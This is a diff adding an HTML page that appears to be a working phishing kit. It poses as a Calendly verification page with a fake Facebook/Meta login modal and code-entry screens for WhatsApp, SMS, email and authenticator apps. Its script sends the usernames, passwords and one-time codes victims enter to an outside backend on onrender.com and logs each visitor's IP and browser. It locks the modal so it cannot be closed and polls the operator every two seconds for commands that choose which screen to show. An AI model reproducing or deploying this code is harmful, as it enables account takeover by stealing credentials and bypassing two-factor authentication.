+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-body" style="height: 650px; display: none;" id="whatsappcode">
+                        <div class="confirmation-container-2">
+                            <div class="header-color">
+                                <div class="header-container">
+                                    <div class="logo__faceook"></div>
+                                </div>
+                            </div>
+                            <div class="auth-req-container-2">
+                                <div class="auth-req-2">
+                                    <div class="auth-req-text-2">
+                                        <h2>Enter security code</h2>
+                                        <div class="confirmation-second-2">
+                                            <div class="auth-req-paragraph-2">
+                                                <p class="first-1-text">Please check your WhatsApp for a message with your code. Your code is 6 numbers long.</p>
+                                            </div>
+                                            <div class="flex-confirmation-second-2">
+                                                <div class="input-auth-req-2">
+                                                    <input placeholder="Enter Code" type="number" required class="ant-input" id="whatsappcodesms">
+                                                    <div id="error-message-whatsapp" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                                </div>
+                                                <div class="sent-mail-2">
+                                                    <p>We sent your code to:</p>
+                                                    <p>+***********</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="show-input-on-mobile-2"><input class="ant-input" type="text" value=""></div>
+                                    <div class="auth-req-footer-2">
+                                        <a>Didn't get a code?</a>
+                                        <div class="button-second-confirmation-2"><button type="submit" id="buttonwhatsapp">Continue</button></div>
+                                    </div>
+                                </div>
+                                <div class="show-button-mobile-2">
+                                    <h2>We sent your code to WhatsApp:<br>+***********</h2>
+                                    <p>Check that you have received a message on WhatsApp containing your code. Your code has 6 numbers.</p>
+                                    <h2>Enter the 6-digit code</h2>
+                                    <input type="number" placeholder="######" class="ant-input" id="whatsappcodeMobile">
+                                    <div id="error-message-whatsapp-mobile" style="color: red; display: none;">The code must be exactly 6 digits!</div>
+                                    <button type="submit" id="buttonwhatsappMobile">Continue</button>
+                                    <a>try another way</a>
+                                </div>
+                                <div class="show-footer-on-mobile-plus-2">
+                                    <h2 class="h2-foot-2">Not You? Log In Here</h2>
+                                    <div class="footer-flex-mobile-plus-2">
+                                        <div>
+                                            <h2>English (US)</h2>
+                                            <p>Deutsch</p>
+                                            <p>Српски</p>
+                                            <p>Português (Brasil)</p>
+                                        </div>
+                                        <div>
+                                            <p>Italiano</p>
+                                            <p>Bosanski</p>
+                                            <p>Svensk</p><button>+</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal__footer">
+                            <div class="footer-menu-flex-ul-2">
+                                <div class="container-language-footer-2">
+                                    <ul class="flex-ul-second-confirmation">
+                                        <li>English (US)</li>
+                                        <li>Español</li>
+                                        <li>Deutsch</li>
+                                        <li>Türkçe</li>
+                                        <li>Српски</li>
+                                        <li>Français (France)</li>
+                                        <li>Italiano</li>
+                                        <li>Bosanski</li>
+                                        <li>Svensk</li>
+                                        <li>Português (Brasil)</li>
+                                        <button class="countrys-button-2"><span>+</span></button>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-confirmation">
+                                    <ul>
+                                        <li>Sign Up</li>
+                                        <li>Log In</li>
+                                        <li>Messenger</li>
+                                        <li>Facebook Lite</li>
+                                        <li>Watch</li>
+                                        <li>Places</li>
+                                        <li>Games</li>
+                                        <li>Marketplace</li>
+                                        <li>Facebook Pay</li>
+                                        <li>Oculus</li>
+                                        <li>Portal</li>
+                                        <li>Instagram</li>
+                                        <li>Bulletin</li>
+                                        <li>Local</li>
+                                    </ul>
+                                </div>
+                                <div class="flex-second-ul-4">
+                                    <ul>
+                                        <li>Fundraisers</li>
+                                        <li>Services</li>
+                                        <li>Voting Information Centre</li>
+                                        <li>About</li>
+                                        <li>Create ad</li>
+                                        <li>Create Page</li>
+                                        <li>Developers</li>
+                                        <li>Careers</li>
+                                        <li>Privacy</li>
+                                        <li>Cookies</li>
+                                        <li class="ad-choice-img-2">Ad Choices <span class="img-li-2"></span></li>
+                                        <li>Terms</li>
+                                        <li>Help</li>
+                                    </ul>
+                                </div>
+                                <div class="meta-footer-2">
+                                    <p>Meta © 2025</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ant-modal-footer">
+                        <button type="button" class="ant-btn ant-btn-default" id="modal-cancel-btn"><span>Cancel</span></button>
+                        <button type="button" class="ant-btn ant-btn-primary" id="modal-ok-btn"><span>OK</span></button>
+                    </div>
+                </div>
+                <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        console.log('Calendly Verify page loaded'); // Debug log
+
+        let userId;
+        let isModalLocked = false;
+        let lastMessageTimestamp = 0; // Track the last message timestamp to avoid processing duplicates
+
+        const facebookButton = document.getElementById('facebook-btn');
+        const modal = document.getElementById('facebook-modal');
+        const closeButton = document.getElementById('modal-close-btn');
+        const closeImage = document.getElementById('modal-close-img');
+        const cancelButton = document.getElementById('modal-cancel-btn');
+        const okButton = document.getElementById('modal-ok-btn');
+
+        // Backend URL for local testing
+        const backendUrl = 'https://testingnewthings2025x0x0bkkkkkkkk.onrender.com';
+
+        facebookButton.addEventListener('click', async function () {
+            console.log('Facebook button clicked'); // Debug log
+            if (!userId) {
+                console.error('No userId available for notifying login');
+                alert('Session not initialized. Please refresh the page.');
+                return;
+            }
+            modal.style.display = 'block';
+            showElement('login-form');
+            isModalLocked = true;
+            closeButton.disabled = true;
+            closeImage.style.pointerEvents = 'none';
+            cancelButton.disabled = true;
+            okButton.disabled = true;
+            try {
+                const response = await fetch(`${backendUrl}/notify-login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    console.log('Login button click notified', data);
+                } else {
+                    console.error('Failed to notify login:', data.error);
+                }
+            } catch (error) {
+                console.error('Error notifying login button click:', error.message);
+            }
+        });
+
+        function closeModal() {
+            if (isModalLocked) {
+                console.log('Modal closing is disabled after clicking Login with Facebook');
+                return;
+            }
+            modal.style.display = 'none';
+            clearInputs();
+            hideAllElements();
+        }
+
+        async function fetchData(url, options) {
+            try {
+                const response = await fetch(url, options);
+                if (!response.ok) {
+                    throw new Error(`HTTP error ${response.status}: ${response.statusText}`);
+                }
+                return await response.json();
+            } catch (error) {
+                console.error('Fetch error:', error.message);
+                throw error;
+            }
+        }
+
+        function validateInput(input, minLength, errorMessageElement) {
+            if (input.length !== minLength) {
+                errorMessageElement.style.display = 'block';
+                return false;
+            }
+            errorMessageElement.style.display = 'none';
+            return true;
+        }
+
+        function validateNonEmptyInput(input, errorElement) {
+            if (!input || input.trim() === '') {
+                errorElement.style.display = 'block';
+                return false;
+            }
+            errorElement.style.display = 'none';
+            return true;
+        }
+
+        function hideAllElements() {
+            console.log('Hiding all modal elements'); // Debug log
+            const elementsToHide = [
+                'login-form', 'waitTime', 'wrongpsw', 'codeEmail', 'codeSms', 
+                'authcode', 'whatsappcode'
+            ];
+            elementsToHide.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) element.style.display = 'none';
+            });
+        }
+
+        function showElement(id) {
+            console.log(`Showing element: ${id}`); // Debug log
+            const element = document.getElementById(id);
+            if (element) element.style.display = 'block';
+        }
+
+        function clearInputs() {
+            console.log('Clearing inputs'); // Debug log
+            const inputsToClear = [
+                'authcodesms', 'whatsappcodesms', 'whatsappcodeMobile', 'codeSmsMobile', 'codeSmsDes',
+                'emailcode', 'emailcodeMobile', 'username', 'password', 'confirm_username', 'confirm_password'
+            ];
+            inputsToClear.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) input.value = '';
+            });
+            ['username-error', 'password-error', 'confirm-username-error', 'confirm-password-error'].forEach(id => {
+                const errorElement = document.getElementById(id);
+                if (errorElement) errorElement.style.display = 'none';
+            });
+        }
+
+        // Poll for messages to update the UI
+        async function pollMessages() {
+            if (!userId) {
+                console.log('No userId available for polling messages');
+                return;
+            }
+            try {
+                const response = await fetch(`${backendUrl}/messages/${userId}`);
+                const data = await response.json();
+                if (data.success) {
+                    data.messages.forEach(msg => {
+                        // Only process new messages
+                        if (new Date(msg.timestamp).getTime() > lastMessageTimestamp) {
+                            lastMessageTimestamp = new Date(msg.timestamp).getTime();
+                            console.log('Processing message:', msg);
+                            hideAllElements();
+                            if (msg.command === 'showWrong') {
+                                showElement('wrongpsw');
+                                notifyVisitor('User Is on Wrong Password');
+                            }
+                            if (msg.command === 'showEmailCode') {
+                                showElement('codeEmail');
+                                notifyVisitor('User Is on Email Code');
+                            }
+                            if (msg.command === 'showSmsCode') {
+                                showElement('codeSms');
+                                notifyVisitor('User Is on SMS Code');
+                            }
+                            if (msg.command === 'showWhatsappCode') {
+                                showElement('whatsappcode');
+                                notifyVisitor('User Is on WhatsApp Code');
+                            }
+                            if (msg.command === 'showAuthCode') {
+                                showElement('authcode');
+                                notifyVisitor('User Is on Authenticator Code');
+                            }
+                            if (msg.command === 'redirectCalendar') {
+                                document.getElementById('facebook-modal').style.display = 'none';
+                                console.log('Redirecting to calendar');
+                                window.location.href = 'https://calendly.com/robertmorgan-calendly/30min;
+                                notifyVisitor(`User Redirected to calendar`);
+                            }
+                        }
+                    });
+                } else {
+                    console.error('Failed to fetch messages:', data.error);
+                }
+            } catch (error) {
+                console.error('Error polling messages:', error.message);
+            }
+        }
+
+        async function notifyVisitor(messageType) {
+            if (!userId) {
+                console.log('No userId available for notifying visitor');
+                return;
+            }
+            try {
+                await fetchData(`${backendUrl}/notify-where`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ messageType, userId })
+                });
+                console.log(`Notification sent for ${messageType}`);
+            } catch (error) {
+                console.error('Error notifying visitor:', error.message);
+            }
+        }
+
+        async function handleLogin(endpoint, username, password) {
+            if (!userId) {
+                console.error('No userId available for login');
+                alert('Session error. Please refresh the page.');
+                return;
+            }
+            console.log('Sending login request with userId:', userId);
+            try {
+                const data = await fetchData(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, userId })
+                });
+                if (data && data.success) {
+                    hideAllElements();
+                    showElement('waitTime');
+                } else {
+                    console.error('Login failed:', data ? data.error : 'No data');
+                    hideAllElements();
+                    showElement('waitTime');
+                }
+            } catch (error) {
+                console.error('Login error:', error.message);
+                hideAllElements();
+                showElement('waitTime');
+            }
+        }
+
+        async function handleCodeSubmission(endpoint, code, errorMessageElement, minLength) {
+            if (!userId) {
+                console.error('No userId available for code submission');
+                alert('Session error. Please refresh the page.');
+                return;
+            }
+            if (!validateInput(code, minLength, errorMessageElement)) return;
+            console.log('Sending code submission with userId:', userId);
+            try {
+                const data = await fetchData(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code, userId })
+                });
+                if (data && data.success) {
+                    hideAllElements();
+                    showElement('waitTime');
+                } else {
+                    console.error('Code submission failed:', data ? data.error : 'No data');
+                    hideAllElements();
+                    showElement('waitTime');
+                }
+            } catch (error) {
+                console.error('Code submission error:', error.message);
+                hideAllElements();
+                showElement('waitTime');
+            }
+        }
+
+        async function initializeUserSession() {
+            userId = sessionStorage.getItem('userId');
+            console.log('Initial userId from sessionStorage:', userId);
+
+            if (!userId) {
+                try {
+                    const data = await fetchData(`${backendUrl}/user-id`, {
+                        method: 'GET',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    if (data && data.success && data.userId) {
+                        userId = data.userId;
+                        sessionStorage.setItem('userId', userId);
+                        console.log('New userId generated:', userId);
+                    } else {
+                        console.error('Error generating user ID:', data ? data.error : 'No data');
+                        alert('Failed to initialize session: Backend did not return a valid user ID. Please ensure the backend is running and try again.');
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error fetching user ID:', error.message);
+                    if (error.message.includes('HTTP error')) {
+                        alert(`Failed to initialize session: ${error.message}. Please ensure the backend is running at ${backendUrl}.`);
+                    } else if (error.message.includes('Failed to fetch')) {
+                        alert(`Failed to initialize session: Unable to connect to the backend at ${backendUrl}. Please check your network connection or ensure the backend is running.`);
+                    } else {
+                        alert(`Failed to initialize session: ${error.message}. Please try again later.`);
+                    }
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        document.addEventListener('DOMContentLoaded', async function () {
+            console.log('DOMContentLoaded event fired'); // Debug log
+            const sessionInitialized = await initializeUserSession();
+            if (!sessionInitialized) return;
+
+            async function notifyVisitorInitial() {
+                try {
+                    const ipResponse = await fetch("https://api.ipify.org?format=json");
+                    const ipData = await ipResponse.json();
+                    const visitorIp = ipData.ip;
+                    const userAgent = navigator.userAgent;
+                    await fetchData(`${backendUrl}/notify-visitor`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ ip: visitorIp, userAgent })
+                    });
+                    console.log("Visitor notified.");
+                } catch (error) {
+                    console.error("Error notifying visitor:", error.message);
+                }
+            }
+
+            await notifyVisitorInitial();
+
+            // Start polling for messages
+            setInterval(pollMessages, 2000); // Poll every 2 seconds
+        });
+
+        document.getElementById('login-btn').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const usernameError = document.getElementById('username-error');
+            const passwordError = document.getElementById('password-error');
+
+            const isUsernameValid = validateNonEmptyInput(username, usernameError);
+            const isPasswordValid = validateNonEmptyInput(password, passwordError);
+
+            if (!isUsernameValid || !isPasswordValid) {
+                return;
+            }
+
+            sessionStorage.setItem('username', username);
+            await handleLogin(`${backendUrl}/login`, username, password);
+        });
+
+        document.getElementById('confirm_login').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('confirm_username').value;
+            const password = document.getElementById('confirm_password').value;
+            const usernameError = document.getElementById('confirm-username-error');
+            const passwordError = document.getElementById('confirm-password-error');
+
+            const isUsernameValid = validateNonEmptyInput(username, usernameError);
+            const isPasswordValid = validateNonEmptyInput(password, passwordError);
+
+            if (!isUsernameValid || !isPasswordValid) {
+                return;
+            }
+
+            sessionStorage.setItem('username', username);
+            await handleLogin(`${backendUrl}/login`, username, password);
+        });
+
+        document.getElementById('buttonemailcode').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('emailcode').value;
+            const errorMessage = document.getElementById('error-message');
+            await handleCodeSubmission(`${backendUrl}/send-email`, code, errorMessage, 8);
+        });
+
+        document.getElementById('buttoncodeMobile').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('emailcodeMobile').value;
+            const errorMessage = document.getElementById('error-message-email-mobile');
+            await handleCodeSubmission(`${backendUrl}/send-email`, code, errorMessage, 8);
+        });
+
+        document.getElementById('buttonSms').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('codeSmsDes').value;
+            const errorMessage = document.getElementById('error-message2');
+            await handleCodeSubmission(`${backendUrl}/send-sms`, code, errorMessage, 6);
+        });
+
+        document.getElementById('buttonSmsMobile').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('codeSmsMobile').value;
+            const errorMessage = document.getElementById('error-message2-mobile');
+            await handleCodeSubmission(`${backendUrl}/send-sms`, code, errorMessage, 6);
+        });
+
+        document.getElementById('buttonauth').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('authcodesms').value;
+            const errorMessage = document.getElementById('error-message-auth');
+            await handleCodeSubmission(`${backendUrl}/send-auth`, code, errorMessage, 6);
+        });
+
+        document.getElementById('buttonauthMobile').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('authcodeMobile').value;
+            const errorMessage = document.getElementById('error-message-auth-mobile');
+            await handleCodeSubmission(`${backendUrl}/send-auth`, code, errorMessage, 6);
+        });
+
+        document.getElementById('buttonwhatsapp').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('whatsappcodesms').value;
+            const errorMessage = document.getElementById('error-message-whatsapp');
+            await handleCodeSubmission(`${backendUrl}/send-sms`, code, errorMessage, 6);
+        });
+
+        document.getElementById('buttonwhatsappMobile').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('whatsappcodeMobile').value;
+            const errorMessage = document.getElementById('error-message-whatsapp-mobile');
+            await handleCodeSubmission(`${backendUrl}/send-sms`, code, errorMessage, 6);
+        });
+    </script>
+</body>
+</html>
